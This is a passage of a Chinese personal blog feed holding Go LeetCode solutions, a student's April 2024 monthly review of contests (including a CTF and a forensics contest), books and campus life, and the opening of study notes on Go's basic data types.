encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>（因为英文字母的数量是固定的，为 26 个），哈希表的大小不会超过 26 个字符。</p><h2 id="code-32"><a class="markdownIt-Anchor" href="#code-32"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">minWindow</span><span class="params">(s <span class="type">string</span>, t <span class="type">string</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(s)==<span class="number">0</span>||<span class="built_in">len</span>(t)==<span class="number">0</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    targetCount:=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">0</span>;i&lt;<span class="built_in">len</span>(t);i++&#123;</span><br><span class="line">        targetCount[t[i]]++</span><br><span class="line">    &#125;<span class="comment">//统计t中各个字符的出现频数</span></span><br><span class="line"></span><br><span class="line">    windowCount:=<span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">byte</span>]<span class="type">int</span>)</span><br><span class="line">    left,right:=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    minLen:=<span class="built_in">len</span>(s)+<span class="number">1</span><span class="comment">//随便一个不可能的数字</span></span><br><span class="line">    minStart:=<span class="number">0</span></span><br><span class="line">    required:=<span class="built_in">len</span>(targetCount)<span class="comment">//t中需要被匹配的字符数量</span></span><br><span class="line">    formed:=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> right&lt;<span class="built_in">len</span>(s)&#123;</span><br><span class="line">        char:=s[right]</span><br><span class="line">        windowCount[char]++</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> targetCount[char]&gt;<span class="number">0</span> &amp;&amp; targetCount[char]==windowCount[char]&#123;</span><br><span class="line">            formed++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> left&lt;=right &amp;&amp; formed==required&#123;</span><br><span class="line">            char=s[left]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> right-left+<span class="number">1</span>&lt;minLen&#123;</span><br><span class="line">                minLen=right-left+<span class="number">1</span></span><br><span class="line">                minStart=left</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            windowCount[char]--</span><br><span class="line">            <span class="keyword">if</span> targetCount[char]&gt;<span class="number">0</span> &amp;&amp; targetCount[char]&gt;windowCount[char]&#123;</span><br><span class="line">                formed--</span><br><span class="line">            &#125;</span><br><span class="line">            left++</span><br><span class="line">        &#125;</span><br><span class="line">        right++</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> minLen==<span class="built_in">len</span>(s)+<span class="number">1</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s[minStart:minStart+minLen]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="36有效的数独"><a class="markdownIt-Anchor" href="#36有效的数独"></a> 36.有效的数独</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/valid-sudoku/description/">36. 有效的数独</a></p></blockquote><h2 id="思路-34"><a class="markdownIt-Anchor" href="#思路-34"></a> 思路</h2><p>根据题给要求检查数独即可，分别按照行、列、小九宫格来依次检查。</p><h2 id="解题过程-5"><a class="markdownIt-Anchor" href="#解题过程-5"></a> 解题过程</h2><p>创建两个二维数组rows和columns，一个三维数组subboxes，用来储存九宫格在对应位置上的数字出现次数。遍历一遍数组，注意到九宫格中的位置i、j，分别对应rows[i]，columns[j]，subboxes[i/3][j/3]。于是只要扫描到一个数字，就将三个表格的index分别+1，index=board[i][j]-1</p><h2 id="复杂度-34"><a class="markdownIt-Anchor" href="#复杂度-34"></a> 复杂度</h2><p>- 时间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>- 空间复杂度: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><h2 id="code-33"><a class="markdownIt-Anchor" href="#code-33"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValidSudoku</span><span class="params">(board [][]<span class="type">byte</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> rows,columns [<span class="number">9</span>][<span class="number">9</span>]<span class="type">int</span></span><br><span class="line">    <span class="keyword">var</span> subboxes [<span class="number">3</span>][<span class="number">3</span>][<span class="number">9</span>]<span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> i,row:=<span class="keyword">range</span> board&#123;</span><br><span class="line">        <span class="keyword">for</span> j,column:=<span class="keyword">range</span> row&#123;</span><br><span class="line">            <span class="keyword">if</span> column==<span class="string">&#x27;.&#x27;</span>&#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                index:=column-<span class="string">&#x27;0&#x27;</span><span class="number">-1</span></span><br><span class="line">                rows[i][index]++</span><br><span class="line">                columns[j][index]++</span><br><span class="line">                subboxes[i/<span class="number">3</span>][j/<span class="number">3</span>][index]++</span><br><span class="line">                <span class="keyword">if</span> rows[i][index]&gt;<span class="number">1</span>||columns[j][index]&gt;<span class="number">1</span>||subboxes[i/<span class="number">3</span>][j/<span class="number">3</span>][index]&gt;<span class="number">1</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="54螺旋矩阵"><a class="markdownIt-Anchor" href="#54螺旋矩阵"></a> 54.螺旋矩阵</h1><blockquote><p>Problem: <a href="https://leetcode.cn/problems/spiral-matrix/description/">54. 螺旋矩阵</a></p></blockquote><h2 id="思路-35"><a class="markdownIt-Anchor" href="#思路-35"></a> 思路</h2><p>题目要求按照顺时针螺旋顺序返回矩阵中的所有元素。我们可以通过设置四个边界（上、下、左、右）来控制遍历方向，并不断缩小边界范围，直到遍历完所有元素。</p><p>这种方法属于模拟法，即通过人为模拟出遍历矩阵的顺序，依次遍历边界并将其缩小，直至不再有元素可遍历。</p><h2 id="解题过程-6"><a class="markdownIt-Anchor" href="#解题过程-6"></a> 解题过程</h2><p>每次遍历按以下顺序进行：</p><p>从左到右遍历当前上边界，并将上边界向下移动。</p><p>从上到下遍历当前右边界，并将右边界向左移动。</p><p>从右到左遍历当前下边界，并将下边界向上移动。</p><p>从下到上遍历当前左边界，并将左边界向右移动。</p><p>当四个边界交叉时，说明已经没有未遍历的元素，结束循环。</p><h2 id="复杂度-35"><a class="markdownIt-Anchor" href="#复杂度-35"></a> 复杂度</h2><p>- <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>m</mi><mo>×</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(m \times n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span> 是矩阵的行数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span> 是矩阵的列数。我们需要遍历矩阵中的每个元素，所以时间复杂度与矩阵中的元素数量成正比。</p><p>- <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>（不考虑返回结果的空间），只使用了固定数量的额外变量。</p><h2 id="code-34"><a class="markdownIt-Anchor" href="#code-34"></a> Code</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">spiralOrder</span><span class="params">(matrix [][]<span class="type">int</span>)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(matrix) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> []<span class="type">int</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    r, d := <span class="built_in">len</span>(matrix[<span class="number">0</span>])<span class="number">-1</span>, <span class="built_in">len</span>(matrix)<span class="number">-1</span>  <span class="comment">// 右边界和下边界</span></span><br><span class="line">    l, u := <span class="number">0</span>, <span class="number">0</span>                             <span class="comment">// 左边界和上边界</span></span><br><span class="line">    result := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> l &lt;= r &amp;&amp; u &lt;= d &#123;</span><br><span class="line">        <span class="comment">// 从左到右</span></span><br><span class="line">        <span class="keyword">for</span> i := l; i &lt;= r; i++ &#123;</span><br><span class="line">            result = <span class="built_in">append</span>(result, matrix[u][i])</span><br><span class="line">        &#125;</span><br><span class="line">        u++</span><br><span class="line">        <span class="keyword">if</span> u &gt; d &#123;  <span class="comment">// 检查上边界是否越界</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从上到下</span></span><br><span class="line">        <span class="keyword">for</span> i := u; i &lt;= d; i++ &#123;</span><br><span class="line">            result = <span class="built_in">append</span>(result, matrix[i][r])</span><br><span class="line">        &#125;</span><br><span class="line">        r--</span><br><span class="line">        <span class="keyword">if</span> r &lt; l &#123;  <span class="comment">// 检查右边界是否越界</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从右到左</span></span><br><span class="line">        <span class="keyword">for</span> i := r; i &gt;= l; i-- &#123;</span><br><span class="line">            result = <span class="built_in">append</span>(result, matrix[d][i])</span><br><span class="line">        &#125;</span><br><span class="line">        d--</span><br><span class="line">        <span class="keyword">if</span> d &lt; u &#123;  <span class="comment">// 检查下边界是否越界</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 从下到上</span></span><br><span class="line">        <span class="keyword">for</span> i := d; i &gt;= u; i-- &#123;</span><br><span class="line">            result = <span class="built_in">append</span>(result, matrix[i][l])</span><br><span class="line">        &#125;</span><br><span class="line">        l++</span><br><span class="line">        <span class="keyword">if</span> l &gt; r &#123;  <span class="comment">// 检查左边界是否越界</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr /><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/%7B930EB68A-6F85-4666-BA42-9333A5074315%7D.png" alt="{930EB68A-6F85-4666-BA42-9333A5074315}" /></p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4月总结·2024</title>
      <link href="/posts/2472bb8ab8a7/"/>
      <url>/posts/2472bb8ab8a7/</url>
      
        <content type="html"><![CDATA[<h1 id="4月总结2024"><a class="markdownIt-Anchor" href="#4月总结2024"></a> 4月总结·2024</h1><p>转眼四月份又过去了……有时候不得不感慨时间过得真快，大学就该开六年。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/Image_1714487114838.jpg" alt="Image_1714487114838" /></p><p>不管怎么说，还是来总结一下已然离去的四月吧。</p><h2 id="比赛篇"><a class="markdownIt-Anchor" href="#比赛篇"></a> 比赛篇</h2><h3 id="广东省大学生计算机设计大赛-面向深度伪造检测的攻击与防御技术"><a class="markdownIt-Anchor" href="#广东省大学生计算机设计大赛-面向深度伪造检测的攻击与防御技术"></a> 广东省大学生计算机设计大赛-面向深度伪造检测的攻击与防御技术</h3><p>同样是某个巨佬同学的上分车队，拿着实验室的项目海投比赛。和之前的划水不同，这次我是实打实的负责了一部分工作。不过我此前从未系统的学习过人工智能，这次也只是草草的看了一篇论文了事，印象可以用阅过即焚来形容。不过好在AI这个黑箱只要不涉及原理部分也不算太难，而且有现成的代码提供，我只需要按照代码复现就好了。之后训练模型在服务器上跑了个通宵，把结果统计一下整理成论文就好了。</p><p>虽然也是个一般般的水赛，但好歹交上去了成品论文，比上个月来说还是个从零到一的质的飞跃（</p><h3 id="蓝桥杯-cc算法设计a组"><a class="markdownIt-Anchor" href="#蓝桥杯-cc算法设计a组"></a> 蓝桥杯-C++/C算法设计A组</h3><p>裸考蓝桥杯，毫无意外的省三参与奖低分滑过……</p><p>不过这也是在意料之中，自己本身也没有特意的去训练算法。回首过去自己也确实一直在忙，但又没有任何成长的实感，累的大汗淋漓却仍在原地踏步，得到这个结果也是应该的。比赛前都说坐到下午一点太折磨了肯定要提前走，实际上却直到一点出考场还有两三道大题没来得及去看。无论是速度还是质量都有所欠缺。</p><p>没记错的话填空题第二题就开始卡住了，而且原因还是因为算错了组合数（严格来说不是算错，而是记混了组合数的定义）。后面的题也都分析的不是很深入，想法有不少瑕疵，而且还白白投入了大量精力。</p><p>日后应该会有机会刻意的去练一些算法题吧，毕竟不是很想走安全这条路，既然选择了开发这些方向就势必绕不开算法。不说要求多精进，达到正常计科er的水准就可以了，而现在肯定是远远不够格的。</p><p>是时候玩玩LeetCode了。</p><h3 id="xyctf"><a class="markdownIt-Anchor" href="#xyctf"></a> XYCTF</h3><p>大二下，也是入队后参与度最高的一次CTF。毕竟是新生赛，难度对我来说刚刚好，慢慢钻研能学到东西又不至于卡着坐冷板凳。于是打着打着就打到了第一，不过后续一周因为各种考试又不得不放下了比赛去处理其他事情，导致排名最终下滑到了第五。也没什么好说的，毕竟打得再好也是团队的声誉，算不到我头上。关于这次比赛的WP我已经早几天发布在博客<a href="https://adam8en.github.io/2024/04/27/CTF%E9%97%AE%E9%A2%98%E9%9B%86/2024XYCTF%E3%81%AE%E9%83%A8%E5%88%86wp%E8%AF%A6%E8%A7%A3/">2024XYCTF の部分 wp 详解 | Adam8en の 8log</a>。</p><p>其实我对CTF的看法可以说是爱憎交加，一方面它确实是我作为网安专业的技能中最专精的一个，另一方面这条路又过于陡峭让人望而却步，而且尽头的风景也未必见得好。到现在我也可以说对Web方面有一定的了解了，这个方向不难，能玩好工具就能如鱼得水，但层出不穷的各种中间件和奇形怪状的漏洞也容易让人找不着方向。没有扎实的开发基础，光是了解这些中间件又有什么用呢？从某种方面来说，我选择继续精进计算机底层原理和开发基础，也是一种学习网安的方式。对计算机建立起一套成熟扎实的认知体系后，做什么都不急，厚积而薄发，才是王牌。</p><p>况且还有一个比较尴尬的点就是，因为第二个学年才进入校队，所以同年级里已经有一个和我同定位且能力比我更强的Web手。继续留在战队的定位非常尴尬，要再考虑校外的联合战队又不知把握多大，实在是天公不作美。不过既然学校对网安学院资源投入力度远超信科院下其他院系，也不妨抽时间打一打，尽量榨取学校提供的福利吧。</p><h3 id="fic数字取证比赛"><a class="markdownIt-Anchor" href="#fic数字取证比赛"></a> FIC数字取证比赛</h3><p>第一次接触数字取证，抛开比赛本身不谈，内容说实话还挺有意思的。大致就是分析嫌疑人的计算机、服务器、手机检材，尽可能的搜集信息、破解加密、恢复被删除的数据等。一般来说都是晶哥的活，而果不其然这次比赛获奖名单上黑压压的一片全是各种警察学院。因为取证也属于网络安全的一部分，所以我也试着打了下刷刷综测，结果也是竹篮打水一场空。不过重在参与吧，本身也是第一次接触相关内容，能卷赢晶哥才是奇迹。</p><p>推荐autopsy这个软件，能够自动标记出很多可疑的文件，并且检索到被删除但仍能恢复的文件。</p><p>下个月还有个盘古石杯数字取证，期待ing。</p><h2 id="书籍篇"><a class="markdownIt-Anchor" href="#书籍篇"></a> 书籍篇</h2><h3 id="go语言圣经"><a class="markdownIt-Anchor" href="#go语言圣经"></a> Go语言圣经</h3><p>啃了四分之一了，果然还是一边看书一边做笔记学的动。虽然效率慢了点，但是是实打实的给自己的学习留下了印记，不然还得频繁地往前回档，效率反而更低。</p><p>书不错，目前这个内容推进挺舒服的。但是缺乏项目实践，有点空中楼阁的感觉，这一点让我不是很放心。相比之下，学习《C  Primer Plus》和《Python编程·从入门到实践》给我实践的机会更多。但更多原因也是因为当时时间相对充裕，心态也不一样吧。</p><p><strong>除了看书之外，合理运用chatgpt也是学习过程中极为重要的一环</strong>。不得不说人工智能真是一项伟大的发明，不谈什么和制造业深度绑定，起码做个搜索引擎用，当个私人辅导员还是没问题的。平时学习遇到什么问题可以及时的得到反馈，然后充实笔记，运用得当的话学习效率翻个倍绝不是玩笑，而且还能横向拓展知识，简直不要太舒服。</p><h3 id="csapp"><a class="markdownIt-Anchor" href="#csapp"></a> CSAPP</h3><p>在计组时翻着玩玩，因为实在是腾不出时间去学。</p><p>要啃下来这本书，肯定需要花费相当大的精力，笔记是肯定要做的。至于CS61A和Lab，只能说随缘了。</p><p>跳过了整个第二章，一是因为关于二进制信息在计算机底层的存储在计组课上已经提过一嘴，二是因为这部分内容实在是过于底层，我不认为此时钻研过多会有多大的好处，有时候精力也得花在刀刃上。第三章也一度想要全部跳过，不过想了下还是决定跳读着看一遍。主要是因为讲程序的机器级表示时，使用的汇编语言是x86-64，和我选修的汇编语言8086架构不一致。我目前还没有意愿同时双开两个汇编架构的学习，但勉强也能看懂一点类似的逻辑，所以也能凑合着看下去。</p><p>后续肯定是要重读一遍的，毕竟连笔记都没有做，学过就忘，到底学到了多少东西值得怀疑。</p><p>真心厌恶硬件级的计算机底层，能不能直接快进到系统级别的内容啊……</p><h3 id="罪与罚"><a class="markdownIt-Anchor" href="#罪与罚"></a> *罪与罚</h3><p>心血来潮想读，就去读了。因为在知乎上刷到过不少对这本书的安利，并且高度评价了书中的情感刻画，成功引起了我的兴趣。</p><p>目前看了三分之一左右，不得不说俄国人的名字某种程度上也是阅读障碍的一环……不过除此之外，阅读体验也是感觉颇为良好。虽然陀翁的书有着相当多的人物心理描写，但是读的时候并不觉得烦躁（另一本书则恰恰相反，待会再讲）。</p><p>书中对小人物的描写可谓深刻，尤其是索菲亚的父亲马尔梅拉多夫。一个退休的九等文官，妻子曾经是上流社会的名媛，却再嫁到丈夫身边过着穷困潦倒的生活，身患重病却无钱医治。带着三个小孩，住在楼房的过道里，过着食不果腹、衣不蔽体的日子。他也曾经是全家的希望，靠着大女儿出卖身体换来的钱财购置了一副制服准备外出任职，为家人挣取一份体面的生活方式。然而在就任的前一天，他却典当了自己的制服，偷出了家中所有的积蓄到酒馆把自己灌得酩酊大醉，亲手葬送了全家的未来。读来实在是令人嗟叹。至于其他的想法，就等看完后再慢慢说吧。</p><h3 id="占星术杀人魔法"><a class="markdownIt-Anchor" href="#占星术杀人魔法"></a> *占星术杀人魔法</h3><p>评价很简单，名不副实，简直是一坨。</p><p>虽然最后对核心诡计诠释地天衣无缝，但在此之前这本书已经磨掉了我所有的阅读热情。无用的大篇幅环境描写，无用的大篇幅误导，无用的大篇幅生活细节，让我只想着赶紧读完了事。我是来看主角破解四十年未解之悬案的，不是来看主角团逛东京锐评咖啡馆的。而且说实话最后的核心诡计也就那样，没有钟表馆精妙绝伦的设计，也没有杀戮之病最后直击人心的诡叙，实际上只是一个非常简单的谜题包装上了占星术这种看起来高大上的诡计，有种汉堡夹凉菜的既视感。</p><p>总之，过誉了，是我的真实观感。</p><h3 id="君主埃尔梅罗二世事件簿"><a class="markdownIt-Anchor" href="#君主埃尔梅罗二世事件簿"></a> *君主·埃尔梅罗二世事件簿</h3><p>二刺猿浓度提高——</p><p>个人非常钟爱的一个系列，偷偷安利一波。</p><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><h3 id="cpsp漫展"><a class="markdownIt-Anchor" href="#cpsp漫展"></a> CPSP漫展</h3><p>去了几次了，说实话有点累了，但陪朋友一起去的，也算值回票价的口牙。</p><p>不过还是一样的社恐，遇到喜欢的COSER还得踌躇半天才敢上去合照:)</p><h3 id="广州南站志愿服务"><a class="markdownIt-Anchor" href="#广州南站志愿服务"></a> 广州南站志愿服务</h3><p>老地方了，两口气站了八小时是也。</p><p>我发现我还是挺喜欢和人打交道的，虽然问的问题有时候会因为方言问题交流困难，但帮助到别人对我来说也确实会产生一种难以言说的满足感。</p><p>另外广州南站的员工食堂太好吃了。</p><h3 id="宿舍走访查寝"><a class="markdownIt-Anchor" href="#宿舍走访查寝"></a> 宿舍走访查寝</h3><p>大二小登抽查大四老登，倒反天罡。</p><p>也碰到过敲门问问题无人回应的尴尬情况。</p><p>不过脸皮够厚也没什么。</p><h2 id="随便写点"><a class="markdownIt-Anchor" href="#随便写点"></a> 随便写点</h2><p>春意盎然的四月，说过就过去了。而我大部分时间都蛰伏在小小的一隅，甚至还未曾有时间和今年的春天来一次认真的邂逅。上一次写3月总结的自己还历历在目，而我又比起之前的那个我成长了多少呢？</p><p>一直以来我都力求什么事都做到最好，但这条路势必无法继续走下去，必须要做出抉择。选择比努力更重要，一旦明确好未来的方向，很多peer pressure都会自然而然的消散。</p><p>如果你问我有把握这条路的尽头一定是幸福吗？我会说“当然”。可是，我根本没办法保证。我所能回答的“当然”两个字，像是孱弱的钟声，日薄西山，古道瘦马。或许，我只是自私地为自己短暂的挣来了四年感觉应该会快乐的时光而已，甘愿的躺进自己编织的茧里接受催眠。尽管这四年也已经过去了一半。</p><p>我也想要完全放松，想要一切遂愿顺心如意的魔法。所以我就会在深夜里默默写下这些，当一个专门偷窃求不得和意难平的篡改记忆的贼，在自己的一方天地里反复地练习讲着结局圆满的王道剧情，然后盖棺定论，捧出不容置疑、删减过的一切。被文字修饰过的生活是完美无瑕的云端梦境，而躲在云层里做梦的我，只是一个爱看动漫的胆小鬼。女神祝福，圣杯许愿，没关系，都没关系。月亮和玻璃窗上月亮的反光，只要看起来是一样的，又有什么区别？能骗过以后的自己就好。</p><p>夏天要来了，姑且期待一下盛夏的阳光与可乐吧。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/033b910066680a5312d1b433806e879a.jpeg" alt="033b910066680a5312d1b433806e879a" /></p>]]></content>
      
      
      <categories>
          
          <category> 月度总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go修炼手册——基础数据类型</title>
      <link href="/posts/aff86bf46351/"/>
      <url>/posts/aff86bf46351/</url>
      
        <content type="html"><![CDATA[<h2 id="基础数据类型"><a class="markdownIt-Anchor" href="#基础数据类型"></a> 基础数据类型</h2><p>Go语言将数据类型分为四类：基础类型、复合类型、引用类型和接口类型。</p><h3 id="整形"><a class="markdownIt-Anchor" href="#整形"></a> 整形</h3><p>Go语言同时提供了有符号和无符号类型的整数运算。这里有int8、int16、int32和int64四种截然不同大小的有符号整数类型，分别对应8、16、32、64bit大小的有符号整数，与此对应的是uint8、uint16、uint32和uint64四种无符号整数类型。</p><p>除此之外，还提供了对应特地CPU平台机器字大小的类型int和uint，这些类型的大小依赖于具体的实现，和C语言一致。</p><p>Unicode字符rune类型（卢恩字符，古代北欧文字，Lancer使用的魔术！&lt;–月批的丑态）是和int32等价的类型，通常用于表示一个Unicode码点。这两个名称可以互换使用。同样byte也是uint8类型的等价类型，byte类型一般用于强调数值是一个原始的数据而不是一个小的整数。</p><p>uintptr是无符号整数类型，没有指定具体的大小但是足以容纳指针，只有底层编程时会用到，一般是Go语言和C语言函数库或操作系统接口交互的地方。</p><p>这些类型都是不同类型的兄弟类型，相互转换需要显式的类型转换操作。</p><p>它们的底层都是用不同大小的bit位去储存数据，也就是二进制的形式。因此有符号数需要最高位作为符号位，无符号数则不需要符号位，故比相同bit位的有符号数表示范围多一位。</p><p>这样的储存性质决定了他们的溢出现象。在Go中，不管结果是有符号还是没符号，只要需要更多bit位来表示结果，那个超出部分的高位bit部分将被丢弃，也就是向左截断。特别的对于有符号数，如果最高位是1的话上溢会产生负数。</p><h3 id="浮点数"><a class="markdownIt-Anchor" href="#浮点数"></a> 浮点数</h3><p>Go的浮点数和C有部分类似，比如在控制宽度和精度方面都可以用类似于<code>%8.3f</code>之类的声明。除此之外，还定义了有IEEE754规定的正负无穷大<code>+Inf -Inf</code>和非数<code>NaN</code>，一般表示无效的除法操作会出现。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> z <span class="type">float64</span></span><br><span class="line">fmt.Println(z, -z, <span class="number">1</span>/z, <span class="number">-1</span>/z, z/z) <span class="comment">// &quot;0 -0 +Inf -Inf NaN&quot;</span></span><br></pre></td></tr></table></figure><p>可以用math.IsNaN来判断一个数是否是非数，也可以用math.NaN来返回一个NaN。使用NaN时务必要小心，因为NaN和任何数都不相等，包括它自己。</p><h3 id="复数"><a class="markdownIt-Anchor" href="#复数"></a> 复数</h3><p>Go语言提供了两种精度的复数类型：complex64和complex128，分别对应float32和float64两种浮点数精度。内置的complex函数用于构建复数，内建的real和imag函数分别返回复数的实部和虚部：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">complex128</span> = <span class="built_in">complex</span>(<span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 1+2i</span></span><br><span class="line"><span class="keyword">var</span> y <span class="type">complex128</span> = <span class="built_in">complex</span>(<span class="number">3</span>, <span class="number">4</span>) <span class="comment">// 3+4i</span></span><br><span class="line">fmt.Println(x*y) <span class="comment">// &quot;(-5+10i)&quot;</span></span><br><span class="line">fmt.Println(<span class="built_in">real</span>(x*y)) <span class="comment">// &quot;-5&quot;</span></span><br><span class="line">fmt.Println(<span class="built_in">imag</span>(x*y)) <span class="comment">// &quot;10&quot;</span></span><br></pre></td></tr></table></figure><p>如果一个浮点数或者十进制整数后跟着一个i，则被视为是一个复数的虚部，实部为0。</p><h3 id="布尔值"><a class="markdownIt-Anchor" href="#布尔值"></a> 布尔值</h3><p>布尔值只有两种取值，即<code>true</code>和<code>false</code>，具有短路行为，即运算符左边的式子可以确定整个布尔表达式的值，就不会对右边的式子求值</p><p>布尔值不会显示转换为数字值0或1，需要一个显式转换。</p><h3 id="字符串"><a class="markdownIt-Anchor" href="#字符串"></a> 字符串</h3><p>文本字符串通常被解释为采用UTF8编码的Unicode码点（rune）序列。</p><p>内置的len函数可以返回一个字符串中的字节数目（不是rune字符数目），索引操作s[i]返回第i个字节的字节值，i必须满足0 ≤ i&lt; len(s)条件约束。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">s := <span class="string">&quot;hello, world&quot;</span></span><br><span class="line">fmt.Println(<span class="built_in">len</span>(s)) <span class="comment">// &quot;12&quot;</span></span><br><span class="line">fmt.Println(s[<span class="number">0</span>], s[<span class="number">7</span>]) <span class="comment">// &quot;104 119&quot; (&#x27;h&#x27; and &#x27;w&#x27;)</span></span><br><span class="line"></span><br><span class="line">fmt.Println(<span 